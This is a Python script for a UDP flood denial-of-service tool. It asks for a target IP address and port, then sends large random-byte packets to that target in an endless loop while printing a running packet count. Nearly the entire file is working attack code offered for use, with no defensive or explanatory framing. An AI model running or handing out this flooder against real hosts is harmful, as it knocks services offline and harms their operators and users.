import sys
import os
import socket
import random
import platform

# Define some colors for terminal output
R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Generate random bytes for the payload
bytes = random._urandom(2200)
bytes1 = random._urandom(2900)

# Get the operating system
system = platform.uname()[0]

def cls():
    """Clear the screen based on the OS."""
    if system == 'Windows':
        os.system("cls")
    else:  # Mac, Linux, or any other Unix-like system
        os.system("clear")

# Clear the screen
cls()

try:
    os.system("python3 src/logo.py")  # Assuming you're using Python 3
    ip = input("Enter IP Target: ")  # Changed raw_input to input for Python 3
    port = int(input("Enter the Port: "))  # Changed input to int for Python 3
    os.system("python3 src/Starter.py")
except SyntaxError:
    print(R + '[-] ' + C + 'Error code: 422 Unprocessable Entity' + W)

sent = 0
try:
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        print(f"Sending {sent} packet to {ip} through port: {port}")  # Fixed print statement for Python 3

        while True:
            sock.sendto(bytes1, (ip, port))
            sent += 1
            print(f"Sending {sent} packet to {ip} through port: {port}")  # Fixed print statement for Python 3

except KeyboardInterrupt:
    print('\n' + R + '[!]' + C + ' Keyboard Interrupt! Terminating...' + W)

except socket.gaierror:
    print(R + '[-] ' + C + 'No address associated with hostname! Unknown Address' + W)
    print(R + '[-] ' + C + 'Please write the working IP address!' + W)

except NameError:
    print(R + '[-] ' + C + 'No address associated with hostname! Unknown Address' + W)
    print(R + '[-] ' + C + 'Please write the working IP address!' + W)
